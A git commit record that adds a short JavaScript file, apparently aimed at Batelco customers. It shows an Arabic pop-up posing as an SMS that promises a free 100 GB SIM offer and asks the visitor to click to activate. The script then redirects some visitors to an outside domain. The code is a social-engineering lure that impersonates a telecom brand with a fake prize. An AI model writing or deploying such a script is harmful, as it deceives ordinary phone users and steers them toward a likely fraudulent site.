4623941ae757b4853baa497400abed97d784e44c
surepluger <adigunkola666@gmail.com>
2025-03-30 04:54:16 +0100

    Create batelco-active.js

---
+++ batelco-active.js
@@ -0,0 +1,5 @@
+var password = 'تفعيل 100 جيجابايت'
+password=prompt('SMS: مبروك، بطاقة SIM الخاصة بك مؤهلة لتلقي عرض خاص بـ 100 جيجابايت من شريحة SIM القديمة، اضغط على موافق للتفعيل الآن ','تفعيل 100 جيجابايت');
+if (password != 'تفعيل 100 جيجابايت') {
+location.href='https://sureplug.org/batelco';
+}
